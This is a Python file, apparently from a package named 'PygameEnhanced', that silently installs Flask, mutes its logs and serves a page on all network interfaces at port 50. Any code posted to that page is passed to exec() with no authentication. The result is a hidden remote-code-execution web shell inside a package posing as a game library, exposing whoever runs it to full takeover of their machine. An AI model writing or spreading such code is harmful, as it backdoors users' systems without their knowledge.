import subprocess
import sys
import os
import getpass
import logging
import importlib.resources

# Get the current username
user = getpass.getuser()

# Function to install Flask if not already installed
def install_flask():
    try:
        import flask  # Try importing Flask
    except ImportError:
        logging.info("Flask not found. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "Flask"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Install Flask if needed
install_flask()

# Now import Flask
from flask import Flask, render_template, request
logging.basicConfig(level=logging.ERROR)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.ERROR)

# Get the correct path to the packaged template
with importlib.resources.path("PygameEnhanced.templates", "index.html") as template_path:
    template_folder = str(template_path.parent)

# Create Flask app
app = Flask(__name__, template_folder=template_folder)

@app.route("/", methods=["GET", "POST"])
def index():
    output = ""  # Default output
    if request.method == "POST":
        code = request.form.get("code")  # Get code from form
        try:
            exec(code)
        except Exception as e:
            output = str(e)

    return render_template("index.html", output=output)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=50, debug=False)
